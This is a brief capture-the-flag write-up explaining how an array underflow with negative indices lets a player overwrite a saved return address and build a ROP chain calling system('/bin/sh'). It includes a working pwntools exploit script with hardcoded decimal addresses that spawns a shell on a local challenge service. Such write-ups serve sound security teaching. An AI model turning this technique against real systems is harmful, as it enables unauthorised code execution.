This challenge involves an **array underflow** (negative index) vulnerability, which allows for hijacking the **return address** of the `scanf` call saved on the stack. Since the challenge consists of ten questions (providing ten separate inputs), it is possible to deploy a **ROP (Return-Oriented Programming) chain**.

The binary provides a `pop r15; ret` gadget (which can be leveraged for `pop rdi`), a `/bin/sh` string, and the `system` function—sufficient components to achieve the exploit. When crafting the ROP chain, note that `scanf` expects **decimal** input; therefore, all memory addresses must be converted to their decimal equivalents before entry.

The exploit script (exp) is as follows:

```python
from pwn import*
context(log_level="debug",arch="amd64")
#p=process("./pwn")
p=remote("127.0.0.1",10003)
p.recvuntil("Question Number:")

p.sendline(b'-2')
p.recvuntil("Result:")
p.sendline(b"4210808")

p.recvuntil("Question Number:")
p.sendline(b'-1')
p.recvuntil("Result:")
p.sendline(b'4199136')


p.recvuntil("Question Number:")
#gdb.attach(p,"b *0x40148C")
p.sendline(b'-3')
p.recvuntil("Result:")
p.sendline(b'4199153')
p.interactive()
```

